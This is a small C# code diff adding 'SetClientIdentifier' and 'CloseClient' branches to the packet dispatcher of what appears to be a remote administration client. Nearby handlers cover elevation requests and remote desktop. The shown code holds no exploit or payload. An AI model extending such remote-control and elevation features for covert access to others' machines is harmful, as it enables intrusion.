@@ -13,6 +13,14 @@ namespace Client.Packets
             {
                 Controllers.Tools.CommandController.doAskElevate((DoAskElevate)packet, client);
             }
+            else if (type == TypePackets.SetClientIdentifier)
+            {
+                ManageController.setClientIdentifier((SetClientIdentifier)packet, client);
+            }
+            else if (type == TypePackets.CloseClient)
+            {
+                ManageController.CloseClient();
+            }
             else if (type == TypePackets.GetMonitors)
             {
                 RemoteDesktopController.getMonitors(client);
